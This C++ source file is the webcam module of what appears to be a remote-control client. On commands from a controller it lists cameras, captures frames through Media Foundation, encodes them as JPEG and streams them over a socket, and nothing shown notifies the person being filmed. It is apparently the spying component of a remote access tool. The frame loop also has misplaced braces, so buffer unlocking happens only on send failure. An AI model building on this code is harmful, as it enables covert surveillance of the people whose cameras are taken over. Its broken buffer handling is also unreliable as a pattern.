// ============================================================
//  摄像头采集 (Phase 4)
//  Media Foundation Source Reader -> RGB32 -> GDI+ 编码 JPEG
//  -> CMD_CAMERA_FRAME 发给控制端
// ============================================================
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <cstdio>
#include "..\\common\\protocol.h"

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdiplus.lib")

extern SOCKET g_client_socket;
void Log(const char* fmt, ...);
bool SendCmd(SOCKET s, int cmd, const char* body, int len);
bool SendText(SOCKET s, int cmd, const std::string& text);

/* 回一行状态文本给控制端 */
void HandleCameraStop();
void HandleCameraPacket(Packet* p);

static void SendCmdResult(const char* s)
{
	SendText(g_client_socket, CMD_CAMERA_RES, std::string(s ? s : ""));
}

/* ---------------- 状态 ---------------- */
static volatile LONG g_cam_want = 0;      /* 1 = 采集中 */
static HANDLE        g_cam_thread = NULL;
static volatile LONG g_cam_seq = 0;
static volatile LONG g_cam_frames = 0;
static volatile LONG g_cam_bytes = 0;
static volatile LONG g_cam_dev = 0;
static char          g_cam_info[160] = "-";
static ULONG_PTR     g_cam_gdip = 0;

static bool EnsureCameraGdip()
{
	if (g_cam_gdip != 0) return true;
	Gdiplus::GdiplusStartupInput gsi;
	if (Gdiplus::GdiplusStartup(&g_cam_gdip, &gsi, NULL) != Gdiplus::Ok)
	{
		g_cam_gdip = 0;
		return false;
	}
	return true;
}

static int GetJpegClsid(CLSID* pClsid)
{
	UINT num = 0, size = 0;
	if (Gdiplus::GetImageEncodersSize(&num, &size) != Gdiplus::Ok || size == 0)
		return -1;
	Gdiplus::ImageCodecInfo* info = (Gdiplus::ImageCodecInfo*)malloc(size);
	if (info == NULL) return -1;
	int found = -1;
	if (Gdiplus::GetImageEncoders(num, size, info) == Gdiplus::Ok)
	{
		for (UINT i = 0; i < num; ++i)
			if (wcscmp(info[i].MimeType, L"image/jpeg") == 0) { *pClsid = info[i].Clsid; found = (int)i; break; }
	}
	free(info);
	return found;
}

/* 把 RGB32/BGRA 数据编码成 JPEG 到 out */
static bool EncodeJpeg(const unsigned char* bits, int w, int h, int strideIn, int quality, std::vector<char>& out)
{
	if (bits == NULL || w <= 0 || h <= 0) return false;
	if (!EnsureCameraGdip()) return false;

	/* GDI+ 不支持负 stride(自下而上): 需要手工翻转 */
	std::vector<unsigned char> flip;
	const unsigned char* scan = bits;
	int stride = strideIn;
	if (stride < 0)
	{
		int absStride = -stride;
		flip.resize((size_t)absStride * h);
		for (int y = 0; y < h; ++y)
			memcpy(&flip[(size_t)y * absStride], bits + (size_t)(h - 1 - y) * absStride, (size_t)absStride);
		scan = flip.data();
		stride = absStride;
	}

	Gdiplus::Bitmap bmp(w, h, stride, PixelFormat32bppRGB, const_cast<BYTE*>(scan));
	if (bmp.GetLastStatus() != Gdiplus::Ok)
	{
		Log("camera: Bitmap create failed %dx%d stride=%d", w, h, stride);
		return false;
	}
	CLSID clsid;
	if (GetJpegClsid(&clsid) < 0)
	{
		Log("camera: no jpeg encoder");
		return false;
	}
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 1024 * 1024);
	if (hMem == NULL) return false;
	IStream* pStream = NULL;
	if (CreateStreamOnHGlobal(hMem, FALSE, &pStream) != S_OK)
	{
		GlobalFree(hMem);
		return false;
	}
	Gdiplus::EncoderParameters ep;
	ep.Count = 1;
	ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
	ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
	ep.Parameter[0].NumberOfValues = 1;
	ULONG q = (ULONG)((quality < 10 || quality > 100) ? 75 : quality);
	ep.Parameter[0].Value = &q;

	Gdiplus::Status st = bmp.Save(pStream, &clsid, &ep);
	if (st == Gdiplus::Ok)
	{
		LARGE_INTEGER zero;
		zero.QuadPart = 0;
		pStream->Seek(zero, STREAM_SEEK_SET, NULL);
		STATSTG stg;
		memset(&stg, 0, sizeof(stg));
		if (pStream->Stat(&stg, STATFLAG_NONAME) == S_OK && stg.cbSize.QuadPart > 0)
		{
			out.resize((size_t)stg.cbSize.QuadPart);
			ULONG read = 0;
			HRESULT hr = pStream->Read(out.data(), (ULONG)out.size(), &read);
			if (FAILED(hr) || read != out.size()) { out.clear(); st = Gdiplus::GenericError; }
		}
		else st = Gdiplus::GenericError;
	}
	pStream->Release();
	GlobalFree(hMem);
	return (st == Gdiplus::Ok && !out.empty());
}

/* 发送一帧 */
static bool SendCameraFrame(int index, int w, int h, const std::vector<char>& jpg)
{
	SOCKET s = g_client_socket;
	if (s == INVALID_SOCKET) return false;
	CameraFrameHead head;
	memset(&head, 0, sizeof(head));
	head.seq = InterlockedIncrement(&g_cam_seq);
	head.index = index;
	head.w = w;
	head.h = h;
	head.format = RC_CAM_FMT_JPEG;
	head.bytes = (int)jpg.size();

	std::vector<char> body(sizeof(head) + jpg.size());
	memcpy(body.data(), &head, sizeof(head));
	if (!jpg.empty()) memcpy(body.data() + sizeof(head), jpg.data(), jpg.size());
	if (!SendCmd(s, CMD_CAMERA_FRAME, body.data(), (int)body.size()))
	{
		Log("camera: send frame failed, stop capture");
		return false;
	}
	InterlockedIncrement(&g_cam_frames);
	InterlockedExchangeAdd(&g_cam_bytes, (LONG)jpg.size());
	return true;
}

/* 枚举摄像头, 返回描述文本 */
static int EnumCameras(std::string& out)
{
	std::string txt;
	int count = 0;
	IMFAttributes* pAttr = NULL;
	HRESULT hr = MFCreateAttributes(&pAttr, 1);
	if (FAILED(hr)) { out = "err:MF 初始化失败"; return -1; }
	hr = pAttr->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
	IMFActivate** ppDev = NULL;
	UINT32 n = 0;
	if (SUCCEEDED(hr)) hr = MFEnumDeviceSources(pAttr, &ppDev, &n);
	if (FAILED(hr))
	{
		pAttr->Release();
		out = "err:摄像头枚举失败";
		return -1;
	}
	char line[260];
	_snprintf_s(line, _TRUNCATE, "%u 个摄像头:\r\n", (unsigned)n);
	txt = line;
	for (UINT32 i = 0; i < n; ++i)
	{
		WCHAR* name = NULL;
		UINT32 len = 0;
		if (SUCCEEDED(ppDev[i]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &name, &len)) && name != NULL)
		{
			char utf8[520] = { 0 };
			WideCharToMultiByte(CP_UTF8, 0, name, -1, utf8, sizeof(utf8) - 1, NULL, NULL);
			_snprintf_s(line, _TRUNCATE, "  [%u] %s\r\n", i, utf8);
			txt += line;
			CoTaskMemFree(name);
			count++;
		}
		ppDev[i]->Release();
	}
	CoTaskMemFree(ppDev);
	pAttr->Release();
	out = txt;
	return count;
}

/* ---------------- 像素格式转换 (RGB32 之外的兜底) ---------------- */
static inline unsigned char C8(int v) { return (unsigned char)(v < 0 ? 0 : (v > 255 ? 255 : v)); }

static bool Nv12ToBgra(const unsigned char* src, DWORD srcLen, int w, int h, int yStride, std::vector<unsigned char>& out)
{
	if (yStride <= 0) yStride = w;
	{
		size_t need = (size_t)yStride * h + (size_t)yStride * ((h + 1) / 2);
		if ((size_t)srcLen < need)
		{
			Log("camera: NV12 too short (%u < %u)", (unsigned)srcLen, (unsigned)need);
			return false;
		}
	}
	out.resize((size_t)w * h * 4);
	const unsigned char* pY = src;
	const unsigned char* pUV = src + (size_t)yStride * h;
	for (int y = 0; y < h; ++y)
	{
		const unsigned char* yrow = pY + (size_t)y * yStride;
		const unsigned char* uvrow = pUV + (size_t)(y / 2) * yStride;
		unsigned char* orow = out.data() + (size_t)y * w * 4;
		for (int x = 0; x < w; ++x)
		{
			int Yv = yrow[x];
			int u = uvrow[(x / 2) * 2];
			int v = uvrow[(x / 2) * 2 + 1];
			int cc = Yv - 16; if (cc < 0) cc = 0;
			int d = u - 128, e = v - 128;
			unsigned char* p = orow + (size_t)x * 4;
			p[0] = C8((298 * cc + 516 * d + 128) >> 8);
			p[1] = C8((298 * cc - 100 * d - 208 * e + 128) >> 8);
			p[2] = C8((298 * cc + 409 * e + 128) >> 8);
			p[3] = 255;
		}
	}
	return true;
}

static bool Yuy2ToBgra(const unsigned char* src, DWORD srcLen, int w, int h, int strideIn, std::vector<unsigned char>& out)
{
	if (strideIn <= 0) strideIn = w * 2;
	if ((size_t)srcLen < (size_t)strideIn * h)
	{
		Log("camera: YUY2 too short (%u < %u)", (unsigned)srcLen, (unsigned)((size_t)strideIn * h));
		return false;
	}
	out.resize((size_t)w * h * 4);
	for (int y = 0; y < h; ++y)
	{
		const unsigned char* srow = src + (size_t)y * strideIn;
		unsigned char* orow = out.data() + (size_t)y * w * 4;
		for (int x = 0; x + 1 < w; x += 2)
		{
			int Y0 = srow[x * 2], U = srow[x * 2 + 1], Y1 = srow[x * 2 + 2], V = srow[x * 2 + 3];
			int d = U - 128, e = V - 128;
			for (int k = 0; k < 2; ++k)
			{
				int cc = (k == 0 ? Y0 : Y1) - 16; if (cc < 0) cc = 0;
				unsigned char* p = orow + (size_t)(x + k) * 4;
				p[0] = C8((298 * cc + 516 * d + 128) >> 8);
				p[1] = C8((298 * cc - 100 * d - 208 * e + 128) >> 8);
				p[2] = C8((298 * cc + 409 * e + 128) >> 8);
				p[3] = 255;
			}
		}
	}
	return true;
}

/* ---------------- 采集线程 ---------------- */
static DWORD WINAPI CameraThread(LPVOID param)
{
	CameraReq req;
	memcpy(&req, param, sizeof(req));
	free(param);

	int fps = (req.fps >= 1 && req.fps <= 60) ? req.fps : 10;
	int quality = (req.quality >= 10 && req.quality <= 100) ? req.quality : 75;
	int index = (req.index >= 0) ? req.index : 0;
	bool ok = false;

	IMFAttributes* pAttr = NULL;
	IMFActivate** ppDev = NULL;
	UINT32 devCount = 0;
	IMFMediaSource* pSource = NULL;
	IMFSourceReader* pReader = NULL;
	IMFMediaType* pType = NULL;
	UINT32 outW = 0, outH = 0;
	int camFmt = 0;   /* 0=RGB32 1=MJPG 2=NV12 3=YUY2 */
	LONG stride = 0;
	std::vector<char> jpg;
	bool firstFrame = true;

	do
	{
		HRESULT hr = MFCreateAttributes(&pAttr, 1);
		if (FAILED(hr)) { Log("camera: MFCreateAttributes 0x%08x", (unsigned)hr); break; }
		hr = pAttr->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
		if (FAILED(hr)) break;
		hr = MFEnumDeviceSources(pAttr, &ppDev, &devCount);
		if (FAILED(hr)) { Log("camera: MFEnumDeviceSources 0x%08x", (unsigned)hr); break; }
		if (devCount == 0) { Log("camera: no video device"); SendCmdResult("err:被控端没有摄像头设备"); break; }
		if (index >= (int)devCount) index = 0;

		hr = ppDev[index]->ActivateObject(__uuidof(IMFMediaSource), (void**)&pSource);
		if (FAILED(hr)) { Log("camera: ActivateObject 0x%08x", (unsigned)hr); SendCmdResult("err:打开摄像头失败, 可能被其它程序占用"); break; }
		{
			IMFAttributes* pRAttr = NULL;
			if (SUCCEEDED(MFCreateAttributes(&pRAttr, 1)) && pRAttr != NULL)
				pRAttr->SetUINT32(MF_SOURCE_READER_ENABLE_ADVANCED_VIDEO_PROCESSING, TRUE);
			hr = MFCreateSourceReaderFromMediaSource(pSource, pRAttr, &pReader);
			if (pRAttr != NULL) pRAttr->Release();
		}
		if (FAILED(hr)) { Log("camera: create reader 0x%08x", (unsigned)hr); break; }

		{
			/* 依次尝试 RGB32 -> MJPG -> NV12 -> YUY2 (开启高级视频处理后 RGB32 通常可转换得到) */
			const GUID trySubs[4] = { MFVideoFormat_RGB32, MFVideoFormat_MJPG, MFVideoFormat_NV12, MFVideoFormat_YUY2 };
			const char* tryNames[4] = { "RGB32", "MJPG", "NV12", "YUY2" };
			bool got = false;
			camFmt = 0;
			for (int ti = 0; ti < 4 && !got; ++ti)
			{
				IMFMediaType* pTry = NULL;
				if (FAILED(MFCreateMediaType(&pTry)) || pTry == NULL) continue;
				pTry->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
				pTry->SetGUID(MF_MT_SUBTYPE, trySubs[ti]);
				pTry->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
				if (req.width > 0 && req.height > 0)
					MFSetAttributeSize(pTry, MF_MT_FRAME_SIZE, (UINT32)req.width, (UINT32)req.height);
				HRESULT h2 = pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pTry);
				pTry->Release();
				if (SUCCEEDED(h2)) { camFmt = ti; got = true; }
				else Log("camera: %s not accepted (0x%08x)", tryNames[ti], (unsigned)h2);
			}
			if (!got)
			{
				SendCmdResult("err:摄像头格式协商失败");
				break;
			}
		}

		IMFMediaType* pCur = NULL;
		if (SUCCEEDED(pReader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCur)) && pCur != NULL)
		{
			MFGetAttributeSize(pCur, MF_MT_FRAME_SIZE, &outW, &outH);
			UINT32 s32 = 0;
			if (SUCCEEDED(pCur->GetUINT32(MF_MT_DEFAULT_STRIDE, &s32)) && s32 != 0)
				stride = (LONG)s32;
			else
				stride = (camFmt == 0) ? (LONG)(outW * 4) : (camFmt == 3 ? (LONG)(outW * 2) : (LONG)outW);
			const char* sname = (camFmt == 0) ? "RGB32" : (camFmt == 1 ? "MJPG" : (camFmt == 2 ? "NV12" : "YUY2"));
			_snprintf_s(g_cam_info, _TRUNCATE, "cam[%d] %ux%u %s stride=%d fps=%d q=%d",
				index, (unsigned)outW, (unsigned)outH, sname, (int)stride, fps, quality);
			pCur->Release();
		}
		Log("camera: %s", g_cam_info);

		{
			char b[240];
			_snprintf_s(b, _TRUNCATE, "ok:camera starting %ux%u fps=%d q=%d",
				(unsigned)outW, (unsigned)outH, fps, quality);
			SendCmdResult(b);
		}

		ok = true;
		DWORD frameMs = (DWORD)(1000 / fps);
		while (g_cam_want && g_client_socket != INVALID_SOCKET)
		{
			DWORD tStart = GetTickCount();
			DWORD streamIndex = 0, flags = 0;
			LONGLONG ts = 0;
			IMFSample* pSample = NULL;
			HRESULT hr2 = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &ts, &pSample);
			if (FAILED(hr2)) { Log("camera: ReadSample 0x%08x", (unsigned)hr2); break; }
			if (flags & MF_SOURCE_READERF_ENDOFSTREAM) { Log("camera: end of stream"); break; }
			if (pSample != NULL)
			{
				DWORD totLen = 0;
				pSample->GetTotalLength(&totLen);
				IMFMediaBuffer* pBuf = NULL;
				if (SUCCEEDED(pSample->ConvertToContiguousBuffer(&pBuf)) && pBuf != NULL)
				{
					BYTE* pData = NULL;
					DWORD maxLen = 0, curLen = 0;
					if (SUCCEEDED(pBuf->Lock(&pData, &maxLen, &curLen)) && pData != NULL)
					{
						if (totLen > 0 && totLen < curLen) curLen = totLen;
						if (firstFrame)
						{
							Log("camera: first buffer len=%u (frame %ux%u %s stride=%d)",
								(unsigned)curLen, (unsigned)outW, (unsigned)outH,
								(camFmt == 0 ? "RGB32" : (camFmt == 1 ? "MJPG" : (camFmt == 2 ? "NV12" : "YUY2"))), (int)stride);
							firstFrame = false;
						}
						bool sent = false;
						if (camFmt == 1)          /* MJPG: 多数摄像头直接输出 JPEG, 直接透传 */
						{
							if (curLen > 4 && pData[0] == 0xFF && pData[1] == 0xD8)
							{
								DWORD n2 = curLen;
								while (n2 > 3 && pData[n2 - 1] == 0x00) --n2;   /* 去掉尾部 0 填充 */
								for (DWORD k = n2; k >= 2; --k)                  /* 回找 EOI(FFD9) 截断 */
								{
									if (pData[k - 2] == 0xFF && pData[k - 1] == 0xD9) { n2 = k; break; }
									if (k == 2) break;
								}
								jpg.assign((const char*)pData, (const char*)pData + n2);
								sent = true;
							}
							else if (EncodeJpeg(pData, (int)outW, (int)outH, (int)stride, quality, jpg))
								sent = true;
						}
						else if (camFmt == 2)     /* NV12 */
						{
							std::vector<unsigned char> bgra;
							if (Nv12ToBgra(pData, curLen, (int)outW, (int)outH, (int)stride, bgra) &&
								EncodeJpeg(bgra.data(), (int)outW, (int)outH, (int)outW * 4, quality, jpg))
								sent = true;
						}
						else if (camFmt == 3)     /* YUY2 */
						{
							std::vector<unsigned char> bgra;
							if (Yuy2ToBgra(pData, curLen, (int)outW, (int)outH, (int)stride, bgra) &&
								EncodeJpeg(bgra.data(), (int)outW, (int)outH, (int)outW * 4, quality, jpg))
								sent = true;
						}
						else                      /* RGB32 (负 stride 自下而上由 EncodeJpeg 翻转) */
						{
							int absStride = (stride < 0) ? -stride : stride;
							if ((LONGLONG)curLen >= (LONGLONG)absStride * outH)
							{
								if (EncodeJpeg(pData, (int)outW, (int)outH, (int)stride, quality, jpg))
									sent = true;
							}
							else
								Log("camera: RGB32 too short (%u < %u)", (unsigned)curLen, (unsigned)((LONGLONG)absStride * outH));
						}
						if (sent && !SendCameraFrame(index, (int)outW, (int)outH, jpg))
						{
						pBuf->Unlock();
					}
					pBuf->Release();
				}
				pSample->Release();
			}
			}
			DWORD used = GetTickCount() - tStart;
			if (used < frameMs) Sleep(frameMs - used);
		}
		ok = false;
	} while (0);

	g_cam_want = 0;
	if (pType != NULL) pType->Release();
	if (pReader != NULL) pReader->Release();
	if (pSource != NULL)
	{
		pSource->Shutdown();
		pSource->Release();
	}
	if (ppDev != NULL)
	{
		for (UINT32 i = 0; i < devCount; ++i)
			if (ppDev[i] != NULL) ppDev[i]->Release();
		CoTaskMemFree(ppDev);
	}
	if (pAttr != NULL) pAttr->Release();
	Log("camera: thread exit (ok=%d)", ok ? 1 : 0);
	if (g_client_socket != INVALID_SOCKET)
		SendCmdResult("ok:camera stopped");
	if (g_cam_thread != NULL)
	{
		CloseHandle(g_cam_thread);
		g_cam_thread = NULL;
	}
	return 0;
}

/* ---------------- 对外接口 ---------------- */
void HandleCameraPacket(Packet* p)
{
	if (p == NULL) return;
	CameraReq req;
	memset(&req, 0, sizeof(req));
	int n = (p->header.body_len < (int)sizeof(req)) ? p->header.body_len : (int)sizeof(req);
	if (n > 0) memcpy(&req, p->body, (size_t)n);

	if (req.op == RC_CAM_QUERY)
	{
		std::string list;
		EnumCameras(list);
		SendCmdResult(list.c_str());
		return;
	}
	if (req.op == RC_CAM_STOP)
	{
		HandleCameraStop();
		return;
	}
	if (req.op != RC_CAM_START) return;

	if (g_cam_want)
	{
		SendCmdResult("ok:camera already running, restart");
		HandleCameraStop();
		Sleep(200);
	}
	static bool mfStarted = false;
	if (!mfStarted)
	{
		HRESULT hr = MFStartup(MF_VERSION, MFSTARTUP_LITE);
		if (FAILED(hr)) { Log("camera: MFStartup 0x%08x", (unsigned)hr); SendCmdResult("err:Media Foundation 初始化失败"); return; }
		mfStarted = true;
	}
	CameraReq* arg = (CameraReq*)malloc(sizeof(CameraReq));
	if (arg == NULL) { SendCmdResult("err:内存不足"); return; }
	memcpy(arg, &req, sizeof(CameraReq));
	InterlockedExchange(&g_cam_seq, 0);
	InterlockedExchange(&g_cam_frames, 0);
	InterlockedExchange(&g_cam_bytes, 0);
	InterlockedExchange(&g_cam_want, 1);
	g_cam_thread = CreateThread(NULL, 0, CameraThread, arg, 0, NULL);
	if (g_cam_thread == NULL)
	{
		free(arg);
		InterlockedExchange(&g_cam_want, 0);
		Log("camera: CreateThread failed %d", GetLastError());
		SendCmdResult("err:采集线程创建失败");
	}
}

void HandleCameraStop()
{
	if (!g_cam_want)
	{
		char b[200];
		_snprintf_s(b, _TRUNCATE, "ok:camera idle (frames=%d bytes=%d)",
			(int)InterlockedCompareExchange(&g_cam_frames, 0, 0),
			(int)InterlockedCompareExchange(&g_cam_bytes, 0, 0));
		SendCmdResult(b);
		return;
	}
	InterlockedExchange(&g_cam_want, 0);
	for (int i = 0; i < 40 && g_cam_want; ++i) Sleep(50);
	char b[220];
	_snprintf_s(b, _TRUNCATE, "ok:camera stopped (frames=%d bytes=%d)",
		(int)InterlockedCompareExchange(&g_cam_frames, 0, 0),
		(int)InterlockedCompareExchange(&g_cam_bytes, 0, 0));
	SendCmdResult(b);
}
